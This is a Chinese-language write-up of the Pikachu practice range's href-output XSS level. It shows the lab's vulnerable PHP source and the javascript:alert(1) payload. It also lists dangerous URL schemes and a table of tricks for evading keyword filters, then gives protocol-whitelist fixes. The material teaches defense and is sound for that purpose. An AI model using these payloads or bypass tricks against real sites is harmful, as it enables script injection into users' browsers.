# XSS 之 href 输出 通关笔记
> 这关很有意思：**引号都转义了，属性也闭合不了，按理说该安全了。**
>
> 但 payload 里一个引号都不需要——因为 `href` 本身接受"协议"。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | Cross-Site Scripting → xss之href输出 |
| 页面地址 | `http://pikachu/vul/xss/xss_03.php` |
| 页面形式 | 输入框，要求输入一个常用网址 |
| 目标 | 让页面弹窗 |
---
## 二、我的解题步骤
### 步骤 1：先试上一关的 payload
还记得上一关的解法吗？
```html
' onclick='alert(1)
```
提交后页面显示：
```
阁下自己输入的url还请自己点一下吧
```
**点它，没反应。**
### 步骤 2：看源码，发现这次用了 ENT_QUOTES
```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>叫你输入个url,你咋不听?</p>";
    }
    if($_GET['message'] == 'www.baidu.com'){
        $html.="<p class='notice'>我靠,我真想不到你是这样的一个人</p>";
    }else {
        //输出在a标签的href属性里面,可以使用javascript协议来执行js
        //防御:只允许http,https,其次在进行htmlspecialchars处理
        $message=htmlspecialchars($_GET['message'],ENT_QUOTES);
        $html.="<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>";
    }
}
```
两个关键：
1. **`ENT_QUOTES` 加了**——单双引号都转义，属性闭不了
2. **输出位置是 `href`**——URL 属性
而且作者自己已经把答案写在注释里了：
> //输出在a标签的href属性里面,**可以使用javascript协议来执行js**
### 步骤 3：换思路——用 javascript 协议
提交：
```html
javascript:alert(1)
```
### 步骤 4：点链接
页面生成：
```html
<a href='javascript:alert(1)'> 阁下自己输入的url还请自己点一下吧</a>
```
**点它 → 弹窗。**
---
## 三、原理分析
### 3.1 为什么引号转义没用
因为 payload **根本不需要引号**。
`javascript:alert(1)` 里没有任何 `<` `>` `"` `'`，`htmlspecialchars` 一个都不会处理。
**它原样通过。**
### 3.2 为什么点链接会执行
`href` 支持三类值：
| 类型 | 例子 |
| --- | --- |
| 绝对 URL | `http://example.com` |
| 相对路径 | `/admin/` |
| **伪协议** | `javascript:...`、`data:...`、`vbscript:...` |
**`javascript:` 是浏览器支持的伪协议**——点击时执行后面的 JS 代码。
### 3.3 我验证过的真实输出
```html
<a href='javascript:alert(1)'> 阁下自己输入的url还请自己点一下吧</a>
```
原样输出，没有被转义（因为不需要转义）。
### 3.4 同类危险位置
不只是 `href`，**所有接 URL 的属性都危险**：
| 属性 | 场景 |
| --- | --- |
| `href` | `<a>`、`<link>` |
| `src` | `<img>`、`<script>`、`<iframe>` |
| `action` | `<form>` |
| `formaction` | `<button>` |
| `data` | `<object>` |
| `poster` | `<video>` |
| `background` | 旧标签 |
**这些位置的共同点：值是一个 URL。**
---
## 四、知识点与笔记
### 4.1 危险协议清单
| 协议 | 说明 |
| --- | --- |
| `javascript:` | 执行 JS，最常用 |
| `data:` | 可以承载 HTML/JS，如 `data:text/html,<script>alert(1)</script>` |
| `vbscript:` | 旧版 IE |
| `file:` | 本地文件（信息泄露） |
### 4.2 为什么转义防不住
**转义解决的是"语法层面"的问题**：
- `<` 会开启标签
- `"` `'` 会结束属性
**但不解决"语义层面"的问题**：
- `javascript:` 是一个**合法的值**
- 它没有破坏语法，所以转义函数不会碰它
**这就是"上下文不同，防御方式不同"的最好例子。**
### 4.3 检测绕过技巧
有些系统会过滤 `javascript:` 字符串，但可以：
| 技巧 | 例子 |
| --- | --- |
| 大小写 | `JaVaScRiPt:alert(1)` |
| 前后加空白 | ` javascript:alert(1)`（浏览器会 trim） |
| 制表符 / 换行 | `java\tscript:alert(1)` |
| HTML 实体 | `javascript&#58;alert(1)` |
**所以"过滤 javascript 关键字"也是黑名单思路，同样不可靠。**
### 4.4 正确的防御：协议白名单
```php
$url = $_GET['message'];
// 1. 只允许 http / https 开头
if (!preg_match('#^https?://#i', $url)) {
    exit('只允许 http 或 https 链接');
}
// 2. 再做 HTML 转义
$url = htmlspecialchars($url, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
echo "<a href='{$url}'>链接</a>";
```
**顺序很重要：先校验协议，再转义。**
### 4.5 更好的做法：用 URL 解析器
```php
$parts = parse_url($url);
if (!in_array(strtolower($parts['scheme'] ?? ''), ['http', 'https'], true)) {
    exit('非法协议');
}
```
比正则更可靠。
---
## 五、和前面几关的区别
| 关卡 | 防护 | 输出位置 | 绕过点 |
| --- | --- | --- | --- |
| xss之过滤 | 正则黑名单 | HTML 正文 | 大小写 / 换标签 |
| xss之htmlspecialchars | 默认参数转义 | **单引号属性** | 单引号没转义 |
| **xss之href输出** | **ENT_QUOTES 转义** | **href 属性** | **危险协议** |
三关连起来看，是一条很清晰的递进：
```
过滤（删字符）→ 转义（防语法）→ 转义也防不住的"合法值"
```
---
## 六、防御怎么写
### 6.1 三步走
```php
// 第 1 步：协议白名单
$scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?? '');
if (!in_array($scheme, ['http', 'https'], true)) {
    $url = '#';
}
// 第 2 步：HTML 转义
$url = htmlspecialchars($url, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
// 第 3 步：输出
echo "<a href=\"{$url}\">链接</a>";
```
### 6.2 前端同理
```javascript
function safeUrl(u) {
    try {
        var url = new URL(u, location.origin);
        if (url.protocol !== 'http:' && url.protocol !== 'https:') return '#';
        return url.href;
    } catch (e) {
        return '#';
    }
}
```
### 6.3 别忘了其他 URL 属性
`src`、`action`、`formaction`、`poster`、`data` —— **全都要做同样的校验。**
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 转义防不住"合法但危险的值" |
| 关键点 | `href` 接受 `javascript:` 伪协议 |
| payload | `javascript:alert(1)` |
| 为什么转义没用 | payload 里没有需要转义的字符 |
| 修复 | 协议白名单 + 转义 |
**一句话**：
> **转义管"语法"，白名单管"语义"。URL 属性两样都要。**
---
## 参考
- [OWASP: XSS Prevention Cheat Sheet（URL 部分）](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP: Unvalidated Redirects and Forwards](https://owasp.org/www-community/vulnerabilities/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [PHP: parse_url](https://www.php.net/manual/zh/function.parse-url.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
